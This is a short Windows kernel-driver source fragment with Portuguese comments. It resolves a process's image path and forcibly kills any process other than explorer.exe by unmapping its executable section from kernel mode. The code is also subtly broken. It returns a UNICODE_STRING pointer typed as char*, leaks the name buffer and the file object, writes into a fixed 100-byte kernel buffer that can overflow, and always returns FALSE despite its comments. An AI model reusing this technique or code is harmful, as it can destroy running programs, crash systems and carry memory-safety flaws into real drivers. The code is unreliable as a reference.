



// Usado para pegar o nome completo de um processo
NTSTATUS
PsReferenceProcessFilePointer(
	IN  PEPROCESS Process,
	OUT PVOID* OutFileObject
);


// Usado para terminar processos
PVOID PsGetProcessSectionBaseAddress(PEPROCESS Process);
NTSTATUS MmUnmapViewOfSection(PEPROCESS Process, PVOID BaseAddress);

/// <summary>
/// Retorna um nome de um processo
/// </summary>
/// 
/// <param name="Processo">Processo para verificar</param>
/// 
/// <returns>Retorna o nome de um processo</returns>
char* LocalProcesso(IN PEPROCESS Processo)
{
	__try {

		// Objeto arquivo
		PFILE_OBJECT ObjetoArquivo;

		// Onde salvaremos o nome do local do disco
		POBJECT_NAME_INFORMATION ObjetoArquivoInformacao = NULL;

		// Se não conseguir salvar as informações do processo no PFILE_OBJECT
		if (!NT_SUCCESS(PsReferenceProcessFilePointer(Processo, &ObjetoArquivo)))
		{
			// Não retorne nada
			return NULL;
		}

		// Se não conseguir obter o local do driver ("C:\") do arquivo
		if (!NT_SUCCESS(IoQueryFileDosDeviceName(ObjetoArquivo, &ObjetoArquivoInformacao)))
		{
			// Falhou, pare
			return NULL;
		}

		// Libere o objeto
		ObDereferenceObject(ObjetoArquivo);

		// Retorne o nome do arquivo
		return &(ObjetoArquivoInformacao->Name);
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {

	}

	// Nulo
	return NULL;
}

/// <summary>
/// Verifica se o processo é o explorer, e se não for, finaliza ele
/// </summary>
/// 
/// <param name="Processo">Processo para verificar</param>
/// 
/// <returns>Retorna um BOOLEAN, pra dizer se foi o Explorer ou não</returns>
BOOLEAN ExplorerProcesso(IN PEPROCESS Processo)
{
	BOOLEAN Permitir = FALSE;

	// Aloque
	char* NomeProcesso = ExAllocatePool(PagedPool, 100);

	if (!NomeProcesso)
		return Permitir;
	
	// Converta
	sprintf(NomeProcesso, "%wZ", (UNICODE_STRING*)LocalProcesso(Processo));

	// Maiuscula
	_strupr(NomeProcesso);

	if (!strstr(NomeProcesso, "C:\\WINDOWS\\EXPLORER.EXE"))
	{
		// Não é explorer
		KdPrint(("Não é o explorer, vamos mata-lo"));

		MmUnmapViewOfSection(Processo, PsGetProcessSectionBaseAddress(Processo));
	}

	ExFreePool(NomeProcesso);


	return Permitir;
}
